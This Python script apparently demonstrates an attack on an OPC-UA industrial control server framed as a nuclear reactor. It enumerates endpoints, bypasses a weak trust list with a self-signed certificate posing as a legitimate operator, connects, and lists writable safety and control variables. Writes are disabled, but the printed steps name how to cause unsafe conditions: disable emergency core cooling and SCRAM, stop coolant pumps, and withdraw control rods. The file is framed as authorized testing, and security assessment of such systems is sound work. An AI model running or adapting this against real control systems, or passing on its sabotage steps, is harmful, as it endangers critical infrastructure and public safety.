#!/usr/bin/env python3
"""
ICS Exploitation Example - Nuclear Reactor Scenario

Demonstrates a complete OPC-UA ICS exploitation workflow:
1. Enumerate endpoints and security
2. Bypass insecure trust list with self-signed certificate
3. Enumerate PLC variables
4. Identify safety systems
5. Manipulate variables to cause unsafe conditions

WARNING: This is for authorized security testing only.
Do not use against systems without explicit authorization.

Usage:
    python exploit_reactor.py opc.tcp://target:4840
    
    Or set environment variable:
    OPCUA_TARGET=opc.tcp://target:4840 python exploit_reactor.py
"""

import sys
import os

# Add parent directory to path for imports
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from ics_exploitation_mcp import ICSExploitationMCP


def print_banner():
    print("""
    ============================================
     OPC-UA ICS Exploitation - Reactor Demo
    ============================================
    
    Target: Industrial Reactor Control System
    
    Safety Systems:
    - Emergency Core Cooling System (ECCS)
    - SCRAM System (Emergency Shutdown)
    - Coolant Pumps
    - Control Rod Position
    
    Objective: Demonstrate ICS vulnerability
    ============================================
    """)


def exploit_reactor(target_url: str, cert_dir: str = "./exploit_certs"):
    """
    Demonstrate ICS exploitation against a reactor control system.
    
    Args:
        target_url: OPC-UA server URL
        cert_dir: Directory to store certificates
    """
    mcp = ICSExploitationMCP()
    toolkit = mcp.opcua
    
    # Phase 1: Reconnaissance
    print("\n[PHASE 1] Reconnaissance")
    print("-" * 40)
    
    print(f"[*] Target: {target_url}")
    endpoints = toolkit.enumerate_endpoints(target_url)
    
    if "error" in endpoints:
        print(f"[!] Failed: {endpoints['error']}")
        return False
    
    print(f"[+] Security: {endpoints['security_policies']}")
    print(f"[+] {endpoints['recommendation']}")
    
    # Phase 2: Certificate Generation (Trust List Bypass)
    print("\n[PHASE 2] Trust List Bypass")
    print("-" * 40)
    
    print("[*] Generating self-signed certificate...")
    certs = toolkit.generate_self_signed_cert(cert_dir, common_name="LegitOperator")
    
    if "error" in certs:
        print(f"[!] Failed: {certs['error']}")
        return False
    
    print(f"[+] Certificate: {certs['cert_path']}")
    print(f"[+] Thumbprint: {certs['thumbprint']}")
    print("[+] Exploiting insecure trust list - server accepts any certificate")
    
    # Phase 3: Authenticated Connection
    print("\n[PHASE 3] Establishing Connection")
    print("-" * 40)
    
    # Use the strongest available policy
    policy = "Basic256Sha256" if "Basic256Sha256" in endpoints['security_policies'] else \
             "Basic256" if "Basic256" in endpoints['security_policies'] else \
             "Basic128Rsa15" if "Basic128Rsa15" in endpoints['security_policies'] else "None"
    
    mode = "SignAndEncrypt" if policy != "None" else "None"
    
    print(f"[*] Connecting: {policy} / {mode}")
    result = toolkit.connect(
        url=target_url,
        cert_path=certs['cert_path'],
        key_path=certs['key_path'],
        security_policy=policy,
        security_mode=mode
    )
    
    if "error" in result:
        print(f"[!] Connection failed: {result['error']}")
        return False
    
    print("[+] CONNECTED - Trust list bypass successful!")
    
    # Phase 4: Attack Surface Enumeration
    print("\n[PHASE 4] Enumerating Attack Surface")
    print("-" * 40)
    
    writable = toolkit.find_writable_variables(max_depth=6)
    
    if "error" in writable:
        print(f"[!] Enumeration failed: {writable['error']}")
        toolkit.disconnect()
        return False
    
    print(f"[+] Found {writable['count']} writable variables:")
    
    # Categorize variables
    safety_vars = []
    control_vars = []
    
    for var in writable['variables']:
        path_lower = var['path'].lower()
        if 'safety' in path_lower or 'scram' in path_lower or 'emergency' in path_lower:
            safety_vars.append(var)
            print(f"    [SAFETY] {var['path']} = {var['value']}")
        elif 'control' in path_lower or 'pump' in path_lower or 'coolant' in path_lower:
            control_vars.append(var)
            print(f"    [CONTROL] {var['path']} = {var['value']}")
        else:
            print(f"    [OTHER] {var['path']} = {var['value']}")
    
    # Phase 5: Demonstrate Variable Manipulation
    print("\n[PHASE 5] Variable Manipulation Demo")
    print("-" * 40)
    
    if safety_vars:
        print("[*] Safety systems identified - demonstrating read capability:")
        for var in safety_vars[:3]:  # Show first 3
            result = toolkit.read_variable(var['node_id'])
            if "error" not in result:
                print(f"    {var['browse_name']}: {result['value']}")
    
    # NOTE: In an actual assessment, you would manipulate these variables
    # For safety, this example only demonstrates read operations
    print("\n[!] Write operations disabled in example for safety")
    print("[!] In a security assessment, you would:")
    print("    1. Disable ECCS (status -> False)")
    print("    2. Disable SCRAM (armed -> False)")
    print("    3. Turn off cooling pumps")
    print("    4. Withdraw control rods (lower insertedPercentage)")
    
    # Cleanup
    print("\n[PHASE 6] Cleanup")
    print("-" * 40)
    toolkit.disconnect()
    print("[+] Disconnected")
    
    return True


def main():
    print_banner()
    
    # Default target - change for your environment
    TARGET = os.environ.get("OPCUA_TARGET", "opc.tcp://localhost:4840")
    
    if len(sys.argv) > 1:
        TARGET = sys.argv[1]
    
    print(f"Usage: {sys.argv[0]} <opc.tcp://target:port>")
    print(f"       Or set OPCUA_TARGET environment variable\n")
    
    success = exploit_reactor(TARGET)
    
    if success:
        print("\n[+] Exploitation demonstration complete")
    else:
        print("\n[!] Exploitation failed")
    
    return 0 if success else 1


if __name__ == "__main__":
    sys.exit(main())
